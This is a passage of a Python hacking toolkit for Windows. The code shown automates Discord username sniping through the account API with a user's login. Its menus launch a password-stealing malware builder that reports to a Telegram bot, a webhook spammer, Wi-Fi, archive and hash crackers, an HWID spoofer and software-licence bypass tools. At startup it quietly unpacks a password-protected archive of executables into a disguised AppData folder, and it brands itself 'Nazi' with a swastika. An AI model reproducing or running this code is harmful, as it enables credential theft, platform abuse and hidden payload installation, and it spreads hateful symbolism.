        {green}TCP Offload     Set To ==> {white}Rx & Tx Enabled
        {green}UDP Pffload     Set To ==> {white}Rx & Tx Enabled''')

            return True

    def disable_nagle_alg():
        res = subprocess.check_output(
            r'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces', text=True,
            stderr=subprocess.PIPE)
        interfaces = res.strip().split('\n')
        for iface in interfaces:
            res = subprocess.check_output(f'reg query {iface}', text=True, stderr=subprocess.PIPE)
            if ips[0] in res:
                res = subprocess.check_output(
                    f'reg add {iface} /v TcpAckFrequency /t REG_DWORD /d 1 /f && reg add {iface} /v TCPNoDelay /t REG_DWORD /d 1 /f',
                    shell=True, text=True, stderr=subprocess.PIPE)
                if 'The operation completed successfully.' in res:
                    print(f'''{green}        Nagle's Algorithm Set To ==> {white}False''')
                    return True
        print(f'\n{red}[{white}{str(datetime.time(datetime.now())).split(".")[0]}{red}]{red}[console]: {white}The {green}Progress {white}Has Been Done !\n')

    transport_name = re.search('{.+}', get_transport_name(find_mac_address_of_current_adapter()[0])).group()

    try:
        device = find_adapter_registry_key(transport_name)

        values = find_high_value(device)

        values = list(dict.fromkeys(values))

        new_list = [int(i) for i in values]

        new_list.sort()

        highest_value = new_list[-1]

        if change_device_properties(device, str(highest_value)):

            if disable_nagle_alg():
                pass
            else:
                print(f'{red}[-] Error: {white}Unable To Disable Nagle\'s Algorithm !')
        else:
            print(f'\n{red}[-] Error: {white}There Was An Error While Changing The Device Properties')

    except Exception as e:
        print(e)
        time.sleep(3)

    input(f'{red}[{white}{str(datetime.time(datetime.now())).split(".")[0]}{red}]{red}[console]: {white}Hit {red}[Enter] {white}To Exit ')


def discordHunter(email, password):
    def internetChecker():

        print('\n[!] Checking Your Connection To The Internet ...\n')
        try:

            cloudscraper.create_scraper().get('https://www.google.com/')

            return 1

        except:

            return 0

    def randomUser():

        letters = string.ascii_letters + string.digits

        username2 = ''.join(random.choice(letters) for _ in range(3)) + ''.join('_')
        username3 = ''.join(random.choice(letters) for _ in range(3)) + ''.join('.')
        username5 = ''.join('_') + ''.join(random.choice(letters) for _ in range(3))
        username6 = ''.join('.') + ''.join(random.choice(letters) for _ in range(3))
        username8 = ''.join(random.choice(letters) for _ in range(2)) + ''.join('_') + ''.join(
            random.choice(letters) for _ in range(1))
        username9 = ''.join(random.choice(letters) for _ in range(2)) + ''.join('.') + ''.join(
            random.choice(letters) for _ in range(1))
        username11 = ''.join(random.choice(letters) for _ in range(1)) + ''.join('_') + ''.join(
            random.choice(letters) for _ in range(2))
        username12 = ''.join(random.choice(letters) for _ in range(1)) + ''.join('.') + ''.join(
            random.choice(letters) for _ in range(2))

        users = [username2, username3, username5, username6, username8, username9, username11, username12]

        return users

    def dominator(email, password):

        os.system('cls')

        with cloudscraper.create_scraper(debug=False) as s:

            login_url = 'https://discord.com/api/v9/auth/login'

            headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'X-Fingerprint': '1217540505496453165.T6xcPKVjXPtiJR3NoT8BoojkmJY',
                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI3NDM4OCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='

            }

            data = {
                'captcha_key': 'null',
                'login': f"{email}",
                'login_source': 'null',
                'password': f"{password}",
                'undelete': 'false'
            }

            res = s.post(login_url, headers=headers, json=data, timeout=10000)

            try:
                saved_cookies = res.cookies
                token = res.json()['token']

            except:
                print(f'\n{red}[-] Invalid Account Information\n')
                time.sleep(3)
                exit(0)

            print(f'{green}[+] Login Success !\n')
            time.sleep(2)
            os.system('cls')
            counter = 0

            falseUsers = []

            capturedUsers = []

            globalFalse = []

            checkedUsers = []

            ranText = ['You Are A Good Hunter Keep It Up', 'Fire You r BraiN You Bit*h',
                       'Follow Me On Instagram ==> Apkaless',
                       'FBI AND CIA ARE COMING TO UR LOCATION MOVE AWAY RIGHT NOW',
                       'You Got Detected By Discord Security System!!!!!',
                       'I Love When Y O u Use UR Mind',
                       'This is a message from apkaless 2 u son of a good man: dont be bad guy.',
                       'Im From Iraq', 'My Real Name is "S****" Try To Guess My Name :)']

            while True:

                usersList = randomUser()

                try:

                    for username in usersList:

                        if len(globalFalse) > 0:
                            username = globalFalse.pop(0)

                            globalFalse.clear()

                        print(fr'''{cyan}
                ___          __         __              
               /   |  ____  / /______ _/ /__  __________
              / /| | / __ \/ //_/ __ `/ / _ \/ ___/ ___/
             / ___ |/ /_/ / ,< / /_/ / /  __(__  |__  ) 
            /_/  |_/ .___/_/|_|\__,_/_/\___/____/____/  
                  /_/ 
                      
            {yellow}[!] Checking User      : [{white}{username}{yellow}]
            {green}[+] Captured Users     : [{white}{len(capturedUsers)}{green}]
            {red}[-] Unavailable Users  : [{white}{len(falseUsers)}{red}]
            {cyan}[!] Total Checked Users: [{white}{len(checkedUsers)}{cyan}]
            {yellow}[::] {green}{random.choice(ranText)}

                        ''')
                        counter += 1

                        data2 = {
                            'password': f"{password}",
                            'username': f"{username}"
                        }

                        headers2 = {
                            'Accept': '*/*',
                            'Authorization': f'{token}',
                            'Content-Type': 'application/json',
                            'Origin': 'https://discord.com',
                            'Referer': 'https://discord.com/login',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                            'X-Fingerprint': '&',
                            'X-Super-Properties': '&'
                        }

                        user = s.patch('https://discord.com/api/v9/users/@me', headers=headers2, json=data2,
                                       cookies=saved_cookies)

                        if 'code' in user.json():
                            falseUsers.append(username)
                            checkedUsers.append(username)
                            # print(f'\n{counter}) [-] Username Unavailable ===> {username}\n========================\n')
                        elif 'captcha_key' in user.json():
                            # print(f'{counter}) Captured User ===> {username}\n======================')
                            with open('captured.txt', 'a') as f:
                                f.writelines([
                                                 f'====================\nCaptured By Apkaless\n====================\nUser: {username}\n====================\nFollow Me On Instagram ===> Apkaless\n====================\n',
                                                 '\n'])
                                f.close()
                                capturedUsers.append(username)
                                checkedUsers.append(username)

                        elif 'global' in user.json():
                            # print(f'\n{counter}) Flagged User ===> {username}\n====================\n')
                            globalFalse.append(username)
                            time.sleep(2)
                        os.system('cls')
                except IndexError:
                    continue

    if internetChecker():
        dominator(email, password)
    else:
        print(f'{yellow}[!] You Need To Connect To The Internet In Order To Use This Tool')
        time.sleep(3)


def moreOptions():
    global hwid, hash_type
    os.chdir(tool_parent_dir)
    while True:

        os.system('cls')
        try:

            print(f'''
                             
{green}[09] {lcyan}Discord Usernames Checker                                                 {green}[21] {lcyan}Zip File {lcyan}Password Cracker
{green}[10] {lcyan}Discord Webhook Spammer                                                   {green}[22] {lcyan}IP & Domain LOOKUP
{green}[11] {lcyan}Malware {green}(Steal Google Chrome And Opera GX Passwords)                      {green}[23] {lcyan}Phone Number Tracker
{green}[12] {lcyan}Extract All {green}WI-FI Passwords{lcyan} That You Have Connected Recently              {green}[99] {lcyan}Main Menu      
{green}[13] {lcyan}Most Nmap Commands Used By {green}(Black Hat Team)
{green}[14] {lcyan}Wordlist Generator {green}(Brute Force And Dictionary Attack){rescolor}
{green}[15] {lcyan}Convert {green}Python {lcyan}File To {green}EXE {lcyan}File     
{green}[16] {lcyan}Hash {lcyan}Cracker
{green}[17] {lcyan}7z File Password Cracker
{green}[18] {lcyan}Get HWID
{green}[19] {lcyan}Spoof HWID
{green}[20] {lcyan}Wifi Cracker

             ''')
            cmd = input(f'{lcyan}!{green}]==={lcyan}{terminal * 13}{green}==>{white} ')

            if cmd == '9':
                os.system('cls')
                while True:
                    print(f'''{yellow}\n[!] In Order To Use This Tool You Need To Do This:{white}
              
                            *) Go to https://temp-mail.org/
                            *) Copy The Email as it shown at the website
                            *) Go To https://discord.com/register And Create The Account
                            *) Go To https://discord.com/login and Login Into Discord
                            *) Login With Account In This Tool
                            *) Please Keep Your Browser Open and Keep Logged into Discord Website Don\'t Log Out, 
                                  Otherwise This Tool Not Going To Work
                                  ''')

                    webbrowser.open('https://discord.com/login')
                    print(f'{cyan}\n[!] Login Into Discord Using Browser First Then Login Here')

                    emailInput = str(input('\nEmail: '))

                    passwordInput = str(input('\nPassword: '))

                    if emailInput == '':
                        print('\n[!] Email Shouldn\'t Be Empty\n')
                        time.sleep(3)
                        os.system('cls')
                        continue
                    elif passwordInput == '':
                        print('\n[!] Password Shouldn\'t Be Empty\n')
                        time.sleep(3)
                        os.system('cls')
                        continue

                    else:
                        break

                th = threading.Thread(target=discordHunter, args=(emailInput, passwordInput))
                th.start()
                th.join()

                moreOptions()
            if cmd == '10':
                webhookSpammer()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '11':
                os.system('cls')
                try:

                    btoken = input(f'\n{green}[+] Telegram Bot Token:{white} ')
                    cid = input(f'\n{green}[+] Telegram Channel ID:{white} ')
                    malname = input(f'\n{green}[+] Malware Name (*Please Note Mustn\'t Contain Space):{white} ')
                    malico = input(f'\n{green}[+] Icon Path:{white} ')

                    malware(btoken, cid, malname, malico)
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

                except KeyboardInterrupt:
                    pass

            if cmd == '12':
                wifiPassword()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
            if cmd == '13':
                nmapCommands()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '14':
                try:
                    wordlist()
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '15':

                os.system('cls')

                try:

                    appname = input(f'\n{green}[+] App Name:{white} ')

                    appico = input(f'\n{green}[+] Icon Path:{white} ')

                    py2exe(appname, appico)

                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '16':
                os.system('cls')
                try:
                    print(f'''{yellow}[!] {white}Supported Hash Types:
                          
            {blue}[1] {white}sha256
            {blue}[2] {white}sha1
            {blue}[3] {white}sha224
            {blue}[4] {white}sha384
            {blue}[5] {white}sha512                         
            {blue}[6] {white}md5                        
    ''')
                    try:

                        hash_type = int(input(f'{green}[+] Hash Type:{white} '))
                    except:
                        print(f'\n{red}[-] Hash Type is Invalid !')
                        time.sleep(3)
                        moreOptions()
                    os.system('cls')
                    hash = input(f'\n{green}[+] Hash To Crack:{white} ')
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                    hash_cracker(hash, pwdlistinput, hash_type)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '17':
                os.system('cls')
                try:

                    zipfinput = os.path.join(input(f'\n{green}[+] Path To 7z File To Crack:{white} '))
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                    sevenz_cracker(zipfinput, pwdlistinput)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '18':
                os.system('cls')
                try:

                    hwid = get_hwid()
                    print(f'\n{green}[+] HWID:{white} {hwid}')
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '19':
                os.system('cls')
                try:
                    mssg = hwid_spoofer()
                    machine_id = machineID_spoofer()
                    if mssg and machine_id:
                        print(f'\n{green}[+] HWID Spoofed Successfuly.\n')
                        print(f'{green}[+] New HWID is: {get_hwid()}\n')
                        print(f'{yellow}[-] Old HWID is: {hwid}\n')
                    else:
                        print(f'{red}[-] There Was An Error While Spoofing HWID.')
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '20':
                os.system('cls')
                try:

                    pwds = os.path.join(input(f'\n{green}[+] Path To Passwords Dictionary:{white} '))
                    if pwds:

                        crack_wifi(pwds)
                    else:
                        moreOptions()
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '21':
                os.system('cls')
                try:

                    zipfinput = os.path.join(input(f'\n{green}[+] Path To Zip File To Crack:{white} '))
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))

                    if zipfinput and pwdlistinput:

                        zipfilecracker(zipfinput, pwdlistinput)
                    else:
                        moreOptions()

                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '22':
                os.system('cls')
                try:

                    ip = input(f'\n{green}[+] IP Address:{white} ')
                    ip_lookup(ip)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    moreOptions()

            if cmd == '23':
                os.system('cls')
                try:

                    phone_number = input(
                        f'{green}[+] Type The Phone Number Including {blue}(+) {rescolor}{green}and {blue}Country Code:{white} ')

                    phoneNumberTracker(phone_number)

                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

                except:
                    pass
            if cmd == '99':
                main()
        except KeyboardInterrupt:
            os.system('cls')
            print(f'\n{lmagenta}See You Later {green}Mr.{username}\n')


def remove_tools():
    os.chdir(path_to_iqmark)
    shutil.rmtree('tools')


def main():
    os.chdir(path_to_iqmark)
    try:

        while True:

            os.system('cls')
            print(fr'''{white}
                                      ___
                                     |   \
                                     |    \                   ___
                                     |_____\______________.-'`   `'-.,___
                   {yellow}                 /|{white} _____     _________            ___{yellow}>---
                   {yellow}                 \|{white}___________________________,.-'`           
                                        /`'-.,__________)---------------------=\
                                /------/                                        \
                               /                                                 \ 
                              {green}|    {green}[+] Name        : {lcyan}SABAH                       {green}|
                              {green}|    {green}[+] Instagram   : {lcyan}Apkaless                    {green}|
                              {green}|    {green}[+] Github      : {lcyan}https://github.com/apkaless {green}|
                              {green}|    {green}[+] Codename    : {lcyan}{codename}                          {green}|
                              {green}|    {green}[+] Nationality : {lcyan}Iraq                        {green}|                
        ================================================================================================
                                
        {green}[01] {lcyan}IDM Trial Reset                                 {green}[07] {lcyan}PUBLIC IP
        {green}[02] {lcyan}Activate Windows {green}(10 & 11)                      {green}[08] {lcyan}SYSTEM INFORMATION
        {green}[03] {lcyan}Optimize Network Adapter                        {green}[99] {lcyan}More
        {green}[04] {lcyan}Proxy Generator
        {green}[05] {lcyan}Proxy Checker
        {green}[06] {lcyan}Clean Your System With One Hit                    

         ''')

            cmd = input(
                f'{green}[{green}{str(datetime.now().strftime('%a:%m:%d:%y | %I:%M %p'))}{green}]==={lcyan}{terminal * 13}{green}==>{white} ')

            if cmd == '1':
                try:

                    subprocess.check_output('start tools/IDM_Trial_Reset.exe', shell=True)
                except:
                    continue

            if cmd == '2':
                try:

                    subprocess.check_output('start tools/WindowsActivation.exe', shell=True)
                except:
                    continue

            if cmd == '3':
                os.system('cls')
                network_optimization()
                input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '4':
                try:
                    proxy_gen()
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except:
                    continue
            if cmd == '5':
                try:
                    os.system('cls')
                    prxlistinput = os.path.join(input(f'\n{green}[+] Path To Proxies List To Check:{white} '))
                    proxy_check(prxlistinput)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except:
                    continue

            if cmd == '6':
                try:

                    subprocess.check_output('start tools/cleaner.exe', shell=True)
                except:
                    continue

            if cmd == '7':
                ip = public_ip()

                print(f'\n{green}[+] Public IP:{white} {ip}')

                input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '8':
                sysinfo()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '99':
                moreOptions()

        time.sleep(1)

    except KeyboardInterrupt:
        os.system('cls')
        print(f'\n{lmagenta}See You Later {green}Mr.{username}\n')


if __name__ == '__main__':
    os.system('cls')
    red = Fore.RED
    white = Fore.WHITE
    blue = Fore.BLUE
    green = Fore.GREEN
    yellow = Fore.YELLOW
    lightyellow = Fore.LIGHTYELLOW_EX
    cyan = Fore.CYAN
    lcyan = Fore.LIGHTCYAN_EX
    lmagenta = Fore.LIGHTMAGENTA_EX
    rescolor = Fore.RESET
    tool_parent_dir = os.getcwd()
    username = os.getlogin()
    path_to_roaming_windows = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows'
    path_to_iqmark = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/iqmark'
    zipfile_password = 'apkaless@iraq@2003@sabah@@2003'
    os.chdir(path_to_roaming_windows)

    if os.path.exists('iqmark'):
        os.chdir('iqmark')
        if len(os.listdir()) <= 0:
            os.chdir(tool_parent_dir)
            with py7zr.SevenZipFile('tools.7z', mode='r', password=zipfile_password) as zf:
                zf.extractall(path_to_iqmark)
        else:
            pass
    else:
        os.mkdir('iqmark')

    os.chdir(tool_parent_dir)
    with py7zr.SevenZipFile('tools.7z', mode='r', password=zipfile_password) as zf:
        zf.extractall(path_to_iqmark)

    version_info = platform.win32_ver()[0]

    if version_info == '11':

        codename = '卐'
        terminal = '卐'

    else:

        codename = 'Nazi'
        terminal = '#'

    hwid = get_hwid()

    main()
